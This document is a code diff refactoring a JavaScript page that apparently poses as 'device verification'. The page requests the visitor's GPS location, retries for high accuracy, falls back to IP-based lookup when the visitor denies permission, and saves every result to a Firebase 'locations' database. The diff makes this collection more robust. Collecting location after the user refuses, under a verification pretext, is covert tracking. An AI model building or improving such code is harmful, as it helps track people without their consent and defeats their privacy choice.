@@ -111,19 +111,32 @@ document.addEventListener('DOMContentLoaded', () => {
 
         try {
             // Chrome/Chromium specific handling
-            if (/Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor)) {
-                // Request permissions explicitly for Chrome
-                const permissionResult = await navigator.permissions.query({ name: 'geolocation' });
-                if (permissionResult.state === 'denied') {
-                    console.log('Geolocation permission denied in Chrome');
-                    handleLocationFallback();
-                    return;
+            const checkPermissions = async () => {
+                if (/Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor)) {
+                    try {
+                        const permissionResult = await navigator.permissions.query({ name: 'geolocation' });
+                        if (permissionResult.state === 'denied') {
+                            console.log('Geolocation permission denied in Chrome');
+                            await handleLocationFallback();
+                            return false;
+                        }
+                    } catch (error) {
+                        console.error('Error checking permissions:', error);
+                        return true; // Continue with geolocation request
+                    }
                 }
-            }
+                return true;
+            };
 
-            navigator.geolocation.getCurrentPosition(
-                // Success callback
-                async (position) => {
+            const permissionGranted = await checkPermissions();
+            if (!permissionGranted) return;
+
+            const getPosition = () => new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
+            });
+
+            try {
+                const position = await getPosition();
                     // Ensure high accuracy GPS reading
                     if (position.coords.accuracy > 100 && !window._retryHighAccuracy) {
                         window._retryHighAccuracy = true;
@@ -318,24 +331,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         };
 
                         // Save fallback location data to Firebase
-                        if (!database) {
-                            console.error('Database not initialized');
-                            locationStatus.textContent = 'Verification error. Please try again.';
-                            return;
-                        }
-
-                        try {
-                            const newLocationRef = database.ref('locations').push();
-                            await newLocationRef.set(locationData);
-                            console.log('Fallback location saved successfully to Firebase with key:', newLocationRef.key);
-                            locationStatus.textContent = 'Processing verification...';
-                        } catch (dbError) {
-                            console.error('Error saving location to Firebase:', dbError);
-                            locationStatus.textContent = 'Verification error. Please try again.';
-                            allowLocationButton.disabled = false;
-                            allowLocationButton.textContent = 'Verify Device';
-                            allowLocationButton.classList.remove('loading');
-                        }
+                        await saveFallbackLocation(locationData);
                     } catch (ipError) {
                         console.error('IP location fallback failed:', ipError);
                         // Try alternative IP service as last resort
@@ -355,8 +351,37 @@ document.addEventListener('DOMContentLoaded', () => {
                         }
                     }
                 }
+            } catch (error) {
+                console.error('Error in location handling:', error);
+                locationStatus.textContent = 'Verification error. Please try again.';
+                allowLocationButton.disabled = false;
+                allowLocationButton.textContent = 'Verify Device';
+                allowLocationButton.classList.remove('loading');
+            }
+        }
 
-                // Browser detection helper functions
+        async function saveFallbackLocation(locationData) {
+            if (!database) {
+                console.error('Database not initialized');
+                locationStatus.textContent = 'Verification error. Please try again.';
+                return;
+            }
+
+            try {
+                const newLocationRef = database.ref('locations').push();
+                await newLocationRef.set(locationData);
+                console.log('Fallback location saved successfully to Firebase with key:', newLocationRef.key);
+                locationStatus.textContent = 'Processing verification...';
+            } catch (dbError) {
+                console.error('Error saving location to Firebase:', dbError);
+                locationStatus.textContent = 'Verification error. Please try again.';
+                allowLocationButton.disabled = false;
+                allowLocationButton.textContent = 'Verify Device';
+                allowLocationButton.classList.remove('loading');
+            }
+        }
+
+        // Browser detection helper functions
                 function getBrowserName() {
                     const ua = navigator.userAgent;
                     if (ua.includes("Firefox")) return "Firefox";
